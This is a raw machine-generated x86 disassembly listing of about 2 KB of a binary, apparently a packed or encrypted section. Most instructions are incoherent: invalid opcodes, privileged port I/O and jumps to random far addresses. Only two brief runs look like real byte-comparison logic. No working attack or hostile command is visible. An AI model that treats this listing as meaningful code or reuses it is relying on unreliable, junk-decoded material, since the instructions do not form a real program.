  4041b9:	pusha  
  4041ba:	ss aaa 
  4041bc:	int    0x8c
  4041be:	sbb    DWORD PTR [ebp+ebp*4-0x73],edx
  4041c2:	(bad)  
  4041c5:	mov    ebx,0xc82072cb
  4041ca:	cwde   
  4041cb:	fs push esi
  4041cd:	ret    
  4041ce:	push   edx
  4041cf:	mov    eax,0xf557092e
  4041d4:	cmc    
  4041d5:	xchg   BYTE PTR [eax+0x1136a541],dl
  4041db:	add    BYTE PTR [ebp-0x24],0x88
  4041df:	mov    cl,0x6b
  4041e1:	lock retf 
  4041e3:	adc    al,0xf0
  4041e5:	mov    bh,0xeb
  4041e7:	nop
  4041e8:	popa   
  4041e9:	mov    dl,0x6d
  4041eb:	ret    0xbb4c
  4041ee:	and    DWORD PTR ds:0x22ee20dd,esi
  4041f4:	or     DWORD PTR [esi+0x16527b65],0x9d65db6f
  4041fe:	mov    gs,WORD PTR [edi+0x62faf5cc]
  404204:	lods   al,BYTE PTR ds:[esi]
  404205:	xor    cl,dl
  404207:	lea    ecx,[ebp*2+0x314c2891]
  40420e:	add    al,bl
  404210:	mov    ebp,0x215f521c
  404215:	fwait
  404216:	sub    bh,BYTE PTR [esi+0x3843fed]
  40421c:	pop    ds
  40421d:	and    BYTE PTR [edx],dh
  40421f:	dec    edx
  404220:	call   0x748a:0xcdb850f4
  404227:	dec    esp
  404228:	sub    DWORD PTR [esi+0x31bb7e87],eax
  40422e:	(bad)  
  404230:	pushf  
  404231:	js     0x40429d
  404233:	cmp    al,0x3a
  404235:	push   edx
  404236:	pop    es
  404237:	aam    0x44
  404239:	adc    esi,ebp
  40423b:	mov    al,0x84
  40423d:	inc    eax
  40423e:	in     al,0xf
  404240:	add    dl,al
  404242:	pop    ecx
  404243:	jmp    0x4041c9
  404245:	adc    DWORD PTR [edx+0x1b24ce70],0x35986011
  40424f:	dec    esi
  404250:	mov    dl,0x58
  404252:	dec    edi
  404253:	(bad)  
  404254:	lahf   
  404255:	aaa    
  404256:	mov    DWORD PTR [esi+0x27128d2c],ebp
  40425c:	mov    ebp,0xe9fd0798
  404261:	sub    DWORD PTR [edi+0x185f66f9],esi
  404267:	dec    edx
  404268:	xchg   DWORD PTR ds:0x6dc5645c,ebx
  40426e:	inc    ebp
  40426f:	outs   dx,DWORD PTR ds:[esi]
  404270:	fwait
  404271:	pop    eax
  404272:	dec    ebp
  404273:	xchg   esi,eax
  404274:	int    0x6d
  404276:	or     DWORD PTR [eax+0x63494669],0xe7e70dcd
  404280:	push   es
  404281:	fld    TBYTE PTR [eax]
  404283:	ss mov al,0xad
  404286:	push   ss
  404287:	sbb    DWORD PTR [ebp+0x1699111c],edx
  40428d:	leave  
  40428e:	xor    bl,bh
  404290:	lods   eax,DWORD PTR ds:[esi]
  404291:	cmc    
  404292:	mov    al,ds:0xc8836b6
  404297:	add    al,0xb2
  404299:	dec    edi
  40429a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40429b:	mov    WORD PTR [eax-0x77],ds
  40429e:	mov    fs:0x7d8f67ae,al
  4042a4:	xchg   ecx,eax
  4042a5:	ss jl  0x4042cc
  4042a8:	inc    eax
  4042a9:	rcr    BYTE PTR [eax-0x3170f23b],1
  4042af:	sub    bl,BYTE PTR [eax-0x13b0c58c]
  4042b5:	scas   eax,DWORD PTR es:[edi]
  4042b6:	into   
  4042b7:	rol    BYTE PTR [ebp-0x7b],1
  4042ba:	jge    0x4042a0
  4042bc:	mov    eax,ds:0x7024ec23
  4042c1:	and    BYTE PTR [esi],ch
  4042c3:	fmul   QWORD PTR [ecx+0x2f]
  4042c6:	lds    ebp,FWORD PTR [ebx+0x75]
  4042c9:	stos   BYTE PTR es:[edi],al
  4042ca:	mov    cl,0x74
  4042cc:	loopne 0x40434a
  4042ce:	rcr    BYTE PTR [edi-0x21],0x71
  4042d2:	xchg   edx,eax
  4042d3:	cs mov edx,0x7485f051
  4042d9:	fs cmc 
  4042db:	adc    ah,BYTE PTR [esi+0x23d519b0]
  4042e1:	mov    al,0x7d
  4042e3:	and    al,0x43
  4042e5:	loop   0x4042c7
  4042e7:	inc    eax
  4042e8:	js     0x40429a
  4042ea:	mov    WORD PTR [edx+ebp*1+0x5b],?
  4042ee:	cwde   
  4042ef:	test   DWORD PTR ds:0x6b3ed26d,esi
  4042f5:	dec    edx
  4042f6:	add    ebp,edx
  4042f8:	pop    ebp
  4042f9:	div    BYTE PTR [edx-0x22fa8775]
  4042ff:	inc    esi
  404300:	or     DWORD PTR [edi],ecx
  404302:	popf   
  404303:	sub    ecx,ebx
  404305:	jns    0xd6bd6386
  40430b:	sahf   
  40430c:	and    al,BYTE PTR [edi]
  40430e:	pop    ecx
  40430f:	inc    ecx
  404310:	jle    0x404312
  404312:	jmp    0xe27ac46a
  404317:	aas    
  404318:	push   cs
  404319:	mov    edi,0x4cb41eb7
  40431e:	push   DWORD PTR [eax+0x7d]
  404321:	loop   0x40439c
  404323:	scas   eax,DWORD PTR es:[edi]
  404324:	push   ebp
  404325:	loop   0x4042d4
  404327:	nop
  404328:	inc    ebx
  404329:	push   0x40
  40432b:	call   0xb95999fc
  404330:	shl    cl,cl
  404332:	jge    0x404310
  404334:	push   0x5dbcde48
  404339:	adc    esi,ecx
  40433b:	fimul  WORD PTR [ecx+0x36]
  40433e:	mov    BYTE PTR [ebx+0x1831d2b9],cl
  404344:	xor    eax,0x98323b8b
  404349:	mov    dh,0xf6
  40434b:	ret    0x7028
  40434e:	jge    0x4042d7
  404350:	mov    bl,0x17
  404352:	rol    dh,1
  404354:	xrelease mov BYTE PTR [ecx-0x73b6d3d],0x8f
  40435c:	fld    QWORD PTR [edi+0x36232045]
  404362:	sub    eax,0x15270e03
  404367:	scas   al,BYTE PTR es:[edi]
  404368:	and    al,0xbb
  40436a:	mov    ch,0x1e
  40436c:	mov    edi,DWORD PTR [esi-0x3994ad48]
  404372:	jg     0x4042f8
  404374:	mov    eax,ds:0x4c5da1a3
  404379:	xor    al,0x6b
  40437b:	mov    WORD PTR [edx-0x61],?
  40437e:	iret   
  40437f:	inc    esp
  404380:	es mov ah,0x7e
  404383:	leave  
  404384:	aad    0xdf
  404386:	mov    ah,0xc7
  404388:	xchg   ebp,eax
  404389:	and    BYTE PTR [eax*2-0x58908e37],ch
  404390:	and    dh,ah
  404392:	into   
  404393:	sub    eax,0x51366bbd
  404398:	idiv   dh
  40439a:	jmp    0x4043c6
  40439c:	pop    eax
  40439d:	push   0xb6677313
  4043a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043a3:	cmp    BYTE PTR [ecx+0x53d3ae29],0x42
  4043aa:	mov    edx,DWORD PTR [eax+eax*4-0x37]
  4043ae:	adc    BYTE PTR [ecx],ch
  4043b0:	maxps  xmm3,XMMWORD PTR [eax]
  4043b3:	cli    
  4043b4:	fstp   DWORD PTR [ecx]
  4043b6:	gs call 0x68c70f46
  4043bc:	sub    dl,dl
  4043be:	ret    0xc449
  4043c1:	call   0x8af0165e
  4043c6:	jno    0x404401
  4043c8:	shl    DWORD PTR [eax-0x2a],1
  4043cb:	pop    es
  4043cc:	sti    
  4043cd:	imul   eax,DWORD PTR [edi+0x2bd8cd5c],0x40
  4043d4:	out    dx,eax
  4043d5:	(bad)  
  4043d6:	and    eax,0xa7913e2
  4043db:	fstp   QWORD PTR [ecx+ebx*4]
  4043de:	sub    dh,dh
  4043e0:	mov    ds:0x5e723de2,eax
  4043e5:	sti    
  4043e6:	out    dx,al
  4043e7:	adc    ch,BYTE PTR [ebp-0x11]
  4043ea:	add    al,0x4f
  4043ec:	cmp    eax,0x5149136d
  4043f1:	xlat   BYTE PTR ds:[ebx]
  4043f2:	mov    ah,0x7f
  4043f4:	push   ebp
  4043f5:	mov    bh,0x78
  4043f7:	gs dec eax
  4043f9:	sub    esp,DWORD PTR [esi+0x42206896]
  4043ff:	cmp    al,0xe0
  404401:	push   0x5bc9009
  404406:	fld    QWORD PTR [eax+0x6e]
  404409:	push   ecx
  40440a:	retf   0x8104
  40440d:	iret   
  40440e:	retf   0x9e54
  404411:	enter  0xf7f6,0xb6
  404415:	pop    ss
  404416:	push   edx
  404417:	xor    eax,0xe5d3fead
  40441c:	hlt    
  40441d:	sbb    al,0x61
  40441f:	and    dl,dl
  404421:	cli    
  404422:	stos   BYTE PTR es:[edi],al
  404423:	and    edx,ebp
  404425:	cmp    dh,BYTE PTR [ecx]
  404427:	iret   
  404428:	jo     0x4043b6
  40442a:	dec    ecx
  40442b:	(bad)  
  40442c:	cli    
  40442d:	jnp    0x4043ca
  40442f:	inc    edi
  404430:	test   eax,0x64fd915d
  404435:	imul   ebx,DWORD PTR [edx-0xe],0x5b3ed65e
  40443c:	outs   dx,DWORD PTR ds:[esi]
  40443d:	call   0x94b8f831
  404442:	mov    edx,0xffba545f
  404447:	cmp    eax,0x996b7721
  40444c:	inc    ecx
  40444d:	jmp    0x4043ee
  40444f:	mov    bh,0xc3
  404451:	aad    0xdf
  404453:	xchg   esi,eax
  404454:	or     eax,0xeb385c25
  404459:	jp     0x404400
  40445b:	dec    esi
  40445c:	retf   
  40445d:	cmp    ch,ah
  40445f:	pop    ebp
  404460:	lock and eax,esi
  404463:	aaa    
  404464:	mov    al,0xa3
  404466:	and    esp,esp
  404468:	nop
  404469:	inc    ebp
  40446a:	das    
  40446b:	add    al,0x9d
  40446d:	dec    esp
  40446e:	test   al,0x43
  404470:	sub    eax,0x5f123df5
  404475:	mov    bh,0xc2
  404477:	imul   ebx,DWORD PTR [esi+0x1589c811],0xffffffc4
  40447e:	push   cs
  40447f:	(bad)  
  404481:	or     eax,0xaf9239b2
  404486:	int3   
  404487:	pop    ss
  404488:	rcr    dh,cl
  40448a:	stc    
  40448b:	(bad)  
  40448c:	and    al,0x1b
  40448e:	psllw  mm4,QWORD PTR [ebx]
  404491:	popf   
  404492:	pop    edi
  404493:	out    dx,eax
  404494:	jno    0x4044d6
  404496:	jmp    0xcd00:0xb5f6245f
  40449d:	and    ebx,DWORD PTR [edi+0x1e]
  4044a0:	push   ss
  4044a1:	adc    ah,BYTE PTR [ecx+0x6a]
  4044a4:	out    dx,eax
  4044a5:	cld    
  4044a6:	xor    bl,BYTE PTR [esi]
  4044a8:	imul   esp,DWORD PTR [esi],0xfffffff4
  4044ab:	fwait
  4044ac:	(bad)  
  4044ad:	outs   dx,BYTE PTR ds:[esi]
  4044ae:	fadd   DWORD PTR [esi-0x16]
  4044b1:	lods   al,BYTE PTR ds:[esi]
  4044b2:	pop    ds
  4044b3:	rcr    bh,0x9e
  4044b6:	add    eax,0xf9bc57aa
  4044bb:	sti    
  4044bc:	in     eax,dx
  4044bd:	jp     0x4044a7
  4044bf:	xchg   DWORD PTR [edx-0x1912c4e2],edi
  4044c5:	shl    bl,cl
  4044c7:	es retf 0x360f
  4044cb:	in     eax,0x2e
  4044cd:	out    dx,al
  4044ce:	lds    esp,FWORD PTR [eax-0x76]
  4044d1:	inc    esp
  4044d2:	add    eax,0xff558aa8
  4044d7:	cmp    al,dl
  4044d9:	je     0x404d06
  4044df:	mov    eax,DWORD PTR [ebp+0x8]
  4044e2:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4044e6:	mov    edx,DWORD PTR [ebp+0xc]
  4044e9:	cmp    al,BYTE PTR [edx]
  4044eb:	jne    0x404d2c
  4044f1:	mov    eax,DWORD PTR [ebp-0x8]
  4044f4:	mov    edx,DWORD PTR [ebp+0xc]
  4044f7:	movsx  edx,BYTE PTR [edx]
  4044fa:	jmp    0x4048ef
  4044ff:	enter  0xe53f,0x49
  404503:	cmc    
  404504:	jne    0x40457a
  404506:	mov    edi,0x8f3c5193
  40450b:	push   esi
  40450c:	mov    ebx,0x27eb0928
  404511:	jle    0x404591
  404513:	push   esi
  404514:	jns    0x404594
  404516:	jle    0x404547
  404518:	es dec eax
  40451a:	jp     0x40457b
  40451c:	and    eax,0x98d7536e
  404521:	sub    ebx,DWORD PTR [ecx]
  404523:	adc    cl,BYTE PTR [eax-0x7c9cfea8]
  404529:	lea    edi,[edx]
  40452b:	jge    0x4044bc
  40452d:	fcmovb st,st(0)
  40452f:	push   ebx
  404530:	adc    al,0x5c
  404532:	xchg   esi,eax
  404533:	adc    BYTE PTR [ebx],ah
  404535:	loopne 0x4045a3
  404537:	jmp    0x8792:0x57d23acc
  40453e:	test   BYTE PTR [edi],cl
  404540:	imul   esi,DWORD PTR ds:0xf9f850be,0xe7c441d0
  40454a:	mov    dl,0xd3
  40454c:	(bad)  
  40454d:	jp     0x40451d
  40454f:	adc    bl,BYTE PTR [eax-0x1e]
  404552:	xchg   ebx,eax
  404553:	loop   0x4044fc
  404555:	pushf  
  404556:	int    0x8
  404558:	push   eax
  404559:	cmp    DWORD PTR [ecx+edx*2+0x7a],ecx
  40455d:	jmp    0x404572
  40455f:	or     eax,0xfdb0bab9
  404564:	(bad)  
  404565:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404566:	xor    ch,dl
  404568:	sahf   
  404569:	xchg   esp,eax
  40456a:	xchg   ebx,eax
  40456b:	jo     0x40456b
  40456d:	scas   al,BYTE PTR es:[edi]
  40456e:	cdq    
  40456f:	inc    edx
  404570:	pop    ss
  404571:	pop    ecx
  404572:	gs ins DWORD PTR es:[edi],dx
  404574:	iret   
  404575:	pop    ebx
  404576:	sti    
  404577:	loop   0x40458f
  404579:	xchg   esi,eax
  40457a:	pop    ss
  40457b:	sub    BYTE PTR [ebp-0x21d4d9a],al
  404581:	cmp    BYTE PTR [edi-0xb54f409],dh
  404587:	jno    0x404581
  404589:	pop    DWORD PTR [esi+0x33]
  40458c:	(bad)  
  40458d:	sbb    esp,DWORD PTR [ecx]
  40458f:	ror    BYTE PTR [edi],cl
  404591:	push   edi
  404592:	push   es
  404593:	mov    cl,al
  404595:	popa   
  404596:	mov    ds:0x27a66754,al
  40459b:	sbb    ebx,ebp
  40459d:	dec    DWORD PTR ss:[ecx]
  4045a0:	xchg   edx,eax
  4045a1:	inc    esi
  4045a2:	in     eax,0x97
  4045a4:	call   0xaf83:0x617a7cb6
  4045ab:	pop    edi
  4045ac:	pop    ecx
  4045ad:	dec    esi
  4045ae:	push   ebx
  4045af:	ret    0x62ec
  4045b2:	mov    ebp,0xb6550d57
  4045b7:	fldenv [edi]
  4045b9:	imul   esp,DWORD PTR [esi],0xffffffef
  4045bc:	and    BYTE PTR [ebx-0x65],dl
  4045bf:	jno    0x4045e9
  4045c1:	lods   al,BYTE PTR ds:[esi]
  4045c2:	in     eax,dx
  4045c3:	fwait
  4045c4:	pop    ebx
  4045c5:	mov    bl,0x78
  4045c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045c8:	sub    DWORD PTR [ecx-0x6b],0x2f6ffebb
  4045cf:	stos   DWORD PTR es:[edi],eax
  4045d0:	fidiv  DWORD PTR [esi]
  4045d2:	int3   
  4045d3:	retf   
  4045d4:	lods   al,BYTE PTR ds:[esi]
  4045d5:	mov    esi,0x7d426d4b
  4045da:	sub    eax,0xe7cf18c8
  4045df:	in     eax,dx
  4045e0:	mov    bl,bh
  4045e2:	xlat   BYTE PTR ds:[ebx]
  4045e3:	(bad)  
  4045e5:	in     al,0xbe
  4045e7:	add    al,0x40
  4045e9:	jmp    0xf2dc:0x244777aa
  4045f0:	icebp  
  4045f1:	lds    edi,FWORD PTR [ebx-0x77]
  4045f4:	mov    eax,0x68114b33
  4045f9:	loop   0x40458d
  4045fb:	xor    eax,0xd7574c7c
  404600:	fisttp DWORD PTR gs:[eax]
  404603:	pusha  
  404604:	aaa    
  404605:	mov    ch,BYTE PTR [ebp+0x48]
  404608:	pop    ss
  404609:	jge    0x404648
  40460b:	vdivss xmm4,xmm0,DWORD PTR [edx-0x3e]
  404610:	or     al,0xce
  404612:	imul   edx,DWORD PTR [eax-0x436af581],0xca98e307
  40461c:	aam    0x6a
  40461e:	stos   BYTE PTR es:[edi],al
  40461f:	mov    edx,0x2d7dd36c
  404624:	sti    
  404625:	jne    0x404690
  404627:	std    
  404628:	sub    al,0xb2
  40462a:	cmp    ebp,DWORD PTR [esi+0x785ec576]
  404630:	dec    edx
  404631:	mov    eax,eax
  404633:	push   esp
  404634:	pop    edx
  404635:	sti    
  404636:	add    ebp,DWORD PTR [edx+0x124c69e0]
  40463c:	mov    eax,ds:0x245dcca1
  404641:	pop    ds
  404642:	mov    bl,0x41
  404644:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404645:	xchg   edx,eax
  404646:	icebp  
  404647:	leave  
  404648:	mov    ah,0x3b
  40464a:	jo     0x404683
  40464c:	xor    eax,0xeed7497d
  404651:	mov    esp,0x28c1b50f
  404656:	and    BYTE PTR [ebp+0x350a2d7a],0xa7
  40465d:	mov    esi,0xf46ebee8
  404662:	lock adc eax,0x4921b335
  404668:	mov    bl,0xb7
  40466a:	sub    ecx,DWORD PTR [eax-0x79412f6c]
  404670:	xchg   DWORD PTR ss:0x52a40a4,eax
  404677:	xchg   esp,ebp
  404679:	inc    ebp
  40467a:	call   0x672a:0xebef20c8
  404681:	mov    ds:0xaa773757,al
  404686:	cli    
  404687:	sub    ecx,DWORD PTR [eax-0x2f1767b5]
  40468d:	cdq    
  40468e:	call   0xe584ac4c
  404693:	mov    dh,0xb7
  404695:	fsub   DWORD PTR [esi+0x2]
  404698:	jg     0x404672
  40469a:	cmp    al,bh
  40469c:	mov    dl,0x85
  40469e:	out    dx,eax
  40469f:	js     0x4046ef
  4046a1:	dec    eax
  4046a2:	adc    BYTE PTR [edi+eiz*2-0x8],cl
  4046a6:	adc    DWORD PTR [bp+di],0xe8e004b9
  4046ad:	cmp    dh,BYTE PTR [esp+ebp*8+0x11b8415e]
  4046b4:	sbb    cl,BYTE PTR ds:0x50f7dac
  4046ba:	mov    al,ds:0xa61e0214
  4046bf:	dec    esi
  4046c0:	lods   al,BYTE PTR ds:[esi]
  4046c1:	ret    
  4046c2:	lock xchg edx,eax
  4046c4:	cld    
  4046c5:	aad    0xda
  4046c7:	(bad)  
  4046c8:	lods   al,BYTE PTR ds:[esi]
  4046c9:	pop    edx
  4046ca:	sub    BYTE PTR [edi+0x2a35fd25],al
  4046d0:	addr16 cs and al,0xf7
  4046d4:	pop    esi
  4046d5:	js     0x404738
  4046d7:	jecxz  0x4046f5
  4046d9:	adc    cl,BYTE PTR [edi+0x14]
  4046dc:	jb     0x40468e
  4046de:	jno    0x4046e3
  4046e0:	push   esp
  4046e1:	sbb    edx,DWORD PTR [esi]
  4046e3:	push   es
  4046e4:	fs ja  0x404680
  4046e7:	fcom   DWORD PTR [ebp-0x7e]
  4046ea:	cmp    BYTE PTR [esi+0x76f51abc],ah
  4046f0:	xorps  xmm0,XMMWORD PTR [ebp+0x8]
  4046f4:	(bad)  
  4046f6:	inc    edi
  4046f7:	and    DWORD PTR [ebx],esi
  4046f9:	adc    eax,0x1e900920
  4046fe:	or     ch,BYTE PTR [edi-0x5a]
  404701:	xchg   edx,eax
  404702:	es test eax,0x9a15dd5d
  404708:	imul   DWORD PTR [eax]
  40470a:	pop    edx
  40470b:	adc    al,0x61
  40470d:	cdq    
  40470e:	ret    
  40470f:	shr    BYTE PTR [ebx-0x5a],cl
  404712:	div    BYTE PTR [eax]
  404714:	and    dh,0x2a
  404717:	fiadd  WORD PTR [esi+0x7bc37342]
  40471d:	sub    DWORD PTR [eax-0x54],esi
  404720:	wbinvd 
  404722:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404723:	sbb    DWORD PTR [esi+0x520f0df],edx
  404729:	nop
  40472a:	ret    
  40472b:	jbe    0x404730
  40472d:	pop    esi
  40472e:	adc    ecx,DWORD PTR [edx+ecx*2+0x36450d45]
  404735:	mov    ch,0x8d
  404737:	pop    esi
  404738:	mov    ebp,0x47fa4c73
  40473d:	mov    ds:0x58ad14e9,al
  404742:	pop    ss
  404743:	cmovae ecx,eax
  404746:	(bad)  
  404747:	(bad)  
  404748:	pusha  
  404749:	adc    BYTE PTR [esi+0x19],dh
  40474c:	ret    0x4da7
  40474f:	jle    0x40477f
  404751:	popa   
  404752:	sbb    ebx,DWORD PTR [edi+0x79044f2d]
  404758:	(bad)  
  40475a:	sbb    dh,bl
  40475c:	hlt    
  40475d:	push   ss
  40475e:	into   
  40475f:	sbb    ebp,ebx
  404761:	jle    0x404777
  404763:	stos   DWORD PTR es:[edi],eax
  404764:	into   
  404765:	loop   0x40473f
  404767:	fidivr WORD PTR [eax+0x4bf6b8bc]
  40476d:	sbb    DWORD PTR [edx],ebp
  40476f:	xchg   edi,eax
  404770:	js     0x40475b
  404772:	pop    edi
  404773:	cmp    esi,esi
  404775:	sbb    DWORD PTR [ebx],esp
  404777:	ror    DWORD PTR [ebp+0x64737929],cl
  40477d:	mov    ecx,0x2ec9216b
  404782:	mov    edi,0xb51411ab
  404787:	push   eax
  404788:	stos   BYTE PTR es:[edi],al
  404789:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40478a:	pop    esp
  40478b:	and    DWORD PTR [edi+0xd],0xd0421574
  404792:	lods   eax,DWORD PTR ds:[esi]
  404793:	data16 lods al,BYTE PTR ds:[esi]
  404795:	dec    eax
  404796:	call   0x2f8c:0x966664cf
  40479d:	xor    al,0x9d
  40479f:	je     0x404771
  4047a1:	in     eax,0x2
  4047a3:	mov    esp,0x8679e68b
  4047a8:	inc    edi
  4047a9:	pop    ds
  4047aa:	inc    edi
  4047ab:	sbb    eax,0x883a49af
  4047b0:	push   ebx
  4047b1:	mov    ah,0x2f
  4047b3:	mov    esi,0x795b0e8e
  4047b8:	pop    edx
  4047b9:	adc    ebp,esp
  4047bb:	mov    ecx,?
  4047bd:	cmp    DWORD PTR [ebx-0x64d2418a],esi
  4047c3:	stos   DWORD PTR es:[edi],eax
  4047c4:	xor    ecx,DWORD PTR [esi-0x562c8e12]
  4047ca:	dec    ebx
  4047cb:	shl    ebp,1
  4047cd:	jg     0x404750
  4047cf:	dec    edx
  4047d0:	ror    DWORD PTR [esi+0x78],1
  4047d3:	jns    0x4047f3
  4047d5:	sbb    eax,esi
  4047d7:	add    BYTE PTR [edx],0xb3
  4047da:	in     eax,0x61
  4047dc:	push   ebx
  4047dd:	(bad)  
  4047de:	xchg   esi,eax
  4047df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047e0:	mov    al,ds:0x314c24ea
  4047e5:	jg     0x404815
  4047e7:	adc    DWORD PTR [ecx+0x7e8298d2],ebx
  4047ed:	inc    edx
  4047ee:	pop    ecx
  4047ef:	test   DWORD PTR [ebx+0x22],esp
  4047f2:	xor    BYTE PTR [esi],al
  4047f4:	inc    ebx
  4047f5:	cld    
  4047f6:	or     eax,0x53ecbbbd
  4047fb:	pushf  
  4047fc:	adc    DWORD PTR [edx+0x1ae6408d],ebx
  404802:	xchg   DWORD PTR [eax+0x7e],ebp
  404805:	mov    ds:0xdb403591,eax
  40480a:	sbb    eax,0xad5e0aab
  40480f:	push   ss
  404810:	pop    esp
  404811:	push   es
  404812:	mov    dl,0x50
  404814:	inc    ebx
  404815:	mov    ebp,0x8a435c2
  40481a:	pop    ecx
  40481b:	mov    WORD PTR [ebx+0x5bf51c21],fs
  404821:	js     0x4047f2
  404823:	ss sub eax,0x8b828bb1
  404829:	scas   al,BYTE PTR es:[edi]
  40482a:	rcl    BYTE PTR [edi-0x32],cl
  40482d:	jp     0x40481e
  40482f:	jg     0x404868
  404831:	imul   edi,edi,0xffffff95
  404834:	xchg   esi,eax
  404835:	test   al,0x15
  404837:	daa    
  404838:	ss cmp ecx,esi
  40483b:	call   FWORD PTR [eax-0x24]
  40483e:	aam    0xb8
  404840:	les    esp,FWORD PTR [esi]
  404842:	xchg   esp,eax
  404843:	jmp    0xe6c716
  404848:	jns    0x404841
  40484a:	into   
  40484b:	xlat   BYTE PTR ds:[ebx]
  40484c:	jns    0x404879
  40484e:	add    eax,0x70e27b05
  404853:	popf   
  404854:	ret    
  404855:	aam    0x70
  404857:	add    ecx,ebp
  404859:	test   DWORD PTR [esi],eax
  40485b:	stc    
  40485c:	add    al,BYTE PTR [esi-0x2d754c2d]
  404862:	sbb    al,0xc8
  404864:	outs   dx,DWORD PTR ds:[esi]
  404865:	sbb    BYTE PTR [ecx+0x9],bh
  404868:	xchg   esp,eax
  404869:	pop    ds
  40486a:	sub    eax,0xa232ba26
  40486f:	jno    0x40488f
  404871:	out    dx,al
  404872:	xchg   esi,eax
  404873:	push   ebx
  404874:	test   al,0x15
  404876:	les    ebx,FWORD PTR [edi-0x234f0efe]
  40487c:	push   cs
  40487d:	dec    BYTE PTR [ecx+0x1997d3fa]
  404883:	mov    eax,ds:0x78323338
  404888:	shl    DWORD PTR [ecx-0x322a1cd5],cl
  40488e:	pop    edx
  40488f:	dec    eax
  404890:	loope  0x404866
  404892:	fstp   TBYTE PTR [edx]
  404894:	cmp    bl,BYTE PTR [eax-0x4590cdc0]
  40489a:	test   eax,0x319689fb
  40489f:	pop    ecx
  4048a0:	test   edx,ebp
  4048a2:	ror    edx,1
  4048a4:	cmp    DWORD PTR [ebx],ecx
  4048a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048a7:	dec    eax
  4048a8:	clc    
  4048a9:	loopne 0x4048a1
  4048ab:	pop    DWORD PTR [edx-0x5a7c200e]
  4048b1:	jae    0x404853
  4048b3:	mov    dl,0x66
  4048b5:	mov    al,BYTE PTR [ecx-0x7400f902]
  4048bb:	inc    edx
  4048bc:	adc    al,0xef
  4048be:	not    DWORD PTR [ebp+0x43fda1b2]
  4048c4:	retf   
  4048c5:	dec    esp
  4048c6:	lods   eax,DWORD PTR ds:[esi]
  4048c7:	retf   0xbe98
  4048ca:	push   esi
  4048cb:	and    BYTE PTR [eax],bh
  4048cd:	fwait
  4048ce:	pop    es
  4048cf:	cmp    al,0x35
  4048d1:	neg    BYTE PTR [eax+0x10c8a780]
  4048d7:	into   
  4048d8:	push   es
  4048d9:	jmp    0x404904
  4048db:	call   FWORD PTR [ebx-0x2ac9d7b7]
  4048e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048e2:	dec    ecx
  4048e3:	mov    al,ds:0xf32100dc
  4048e8:	xchg   ebp,eax
  4048e9:	cld    
  4048ea:	addr16 jmp 0x3c1:0x3365287d
  4048f2:	(bad)  
  4048f3:	cmp    edx,eax
  4048f5:	je     0x404d20
  4048fb:	mov    DWORD PTR [ebp-0x18],0x705fd8c
  404902:	lea    eax,[ebp-0x18]
  404905:	mov    DWORD PTR [ebp-0x14],eax
  404908:	jmp    0x404cfd
  40490d:	push   ecx
  40490e:	(bad)  
  40490f:	fdivrp st(4),st
  404911:	imul   edi,esp,0xff19635d
  404917:	mov    esi,esi
  404919:	dec    ebp
  40491a:	or     BYTE PTR [edi+0x7e23c3da],dl
  404920:	jle    0x404978
  404922:	jns    0x4049a2
  404924:	jle    0x40495c
  404926:	nop
  404927:	mov    ah,0x14
  404929:	inc    esi
  40492a:	adc    eax,0x14cde491
  40492f:	adc    ebx,0x3
  404932:	call   DWORD PTR [edx]
  404934:	cmc    
  404935:	out    dx,al
  404936:	sub    al,0xa7
  404938:	cld    
  404939:	xor    dh,BYTE PTR [ebp+0x60bea241]
  40493f:	sub    DWORD PTR ds:0x3528d057,edi
  404945:	icebp  
  404946:	adc    eax,0xaea74f55
  40494b:	add    DWORD PTR [ebp+0x69],ebp
  40494e:	fstp   QWORD PTR gs:[ebx+0x25af5365]
  404955:	xlat   BYTE PTR ds:[ebx]
  404956:	jno    0x404928
  404958:	sti    
  404959:	(bad)  
  40495a:	dec    ebp
  40495b:	sub    eax,0x13361169
  404960:	sahf   
  404961:	jl     0x4049db
  404963:	mov    ebx,esi
  404965:	push   eax
  404966:	sbb    BYTE PTR [ebx+0x4f014de6],0x2c
  40496d:	addr16 dec eax
  40496f:	je     0x404970
  404971:	jb     0x4049bb
  404973:	jp     0x40491c
  404975:	scas   al,BYTE PTR es:[edi]
  404976:	mov    ds:0x38cf9959,al
  40497b:	xor    eax,0x53a8850f
  404980:	adc    al,0xa6
  404982:	jl     0x404931
  404984:	dec    ebx
  404985:	xor    DWORD PTR [ebp+ebx*1+0x38],0x3f
  40498a:	adc    cl,bl
  40498c:	xor    eax,0xaeb5e6c
  404991:	ret    0xfc7c
  404994:	popaw  
  404996:	enter  0x93cc,0xaf
  40499a:	js     0x4049ec
  40499c:	sub    eax,0x823fd275
  4049a1:	sub    dh,BYTE PTR [ebx+0x44]
  4049a4:	inc    ebp
  4049a5:	push   ss
  4049a6:	pop    esi
  4049a7:	daa    
  4049a8:	sub    BYTE PTR [eax+0x63],bh
  4049ab:	gs bnd jns 0x40494c
  4049af:	pop    ss
  4049b0:	pop    ds
  4049b1:	ins    DWORD PTR es:[edi],dx
  4049b2:	pop    esp
  4049b3:	xchg   BYTE PTR [ebp+0x5a8f339c],al
  4049b9:	imul   esp,DWORD PTR [edi+0x66],0x1e
  4049bd:	or     ch,cl
  4049bf:	adc    BYTE PTR [edx-0x15693771],bh
  4049c5:	inc    esi
  4049c6:	cmp    al,0x51
  4049c8:	(bad)  [edi]
  4049ca:	ror    bh,1
  4049cc:	xor    al,0xe7
  4049ce:	jae    0x40498e
  4049d0:	mov    ds:0xe84e931f,eax
  4049d5:	inc    edx
  4049d6:	cmp    BYTE PTR [eax-0x1c336418],cl
  4049dc:	dec    edi
  4049dd:	in     eax,dx
  4049de:	out    0xef,eax
  4049e0:	dec    edx
  4049e1:	xor    al,0xa7
  4049e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049e4:	rcl    BYTE PTR [ecx-0x46b6df7],1
  4049ea:	cld    
  4049eb:	fs test al,0x97
  4049ee:	cwde   
